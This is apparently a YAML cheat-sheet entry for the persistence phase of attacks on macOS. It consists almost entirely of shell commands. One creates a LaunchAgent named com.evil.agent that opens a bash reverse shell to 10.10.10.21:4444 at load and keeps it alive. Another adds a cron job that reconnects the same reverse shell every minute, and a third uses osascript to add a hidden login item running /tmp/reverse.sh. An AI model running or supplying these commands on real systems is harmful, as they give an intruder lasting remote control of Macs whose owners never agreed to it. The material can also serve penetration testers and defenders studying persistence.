---
description: |
  macOS persistence techniques — LaunchAgents, LaunchDaemons, cron jobs, login items, and cleanup commands for maintaining access.
commands:
  - have: Shell
    cmd: |
      # LaunchAgent (user-level, no sudo)
      cat > ~/Library/LaunchAgents/com.evil.agent.plist << 'PLIST'
      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
      <plist version="1.0">
      <dict>
          <key>Label</key><string>com.evil.agent</string>
          <key>ProgramArguments</key>
          <array>
              <string>/bin/bash</string><string>-c</string>
              <string>bash -i &gt;&amp; /dev/tcp/10.10.10.21/4444 0&gt;&amp;1</string>
          </array>
          <key>RunAtLoad</key><true/>
          <key>KeepAlive</key><true/>
      </dict>
      </plist>
      PLIST
      launchctl load ~/Library/LaunchAgents/com.evil.agent.plist

      # Cron persistence
      (crontab -l 2>/dev/null; echo "* * * * * bash -i >& /dev/tcp/10.10.10.21/4444 0>&1") | crontab -

      # Login item via osascript
      osascript -e 'tell application "System Events" to make login item at end with properties {path:"/tmp/reverse.sh", hidden:true}'
phase:
  - Persistence
target_os:
  - macOS
services: []
techniques: []
references:
  - https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation/macos-persistence
---
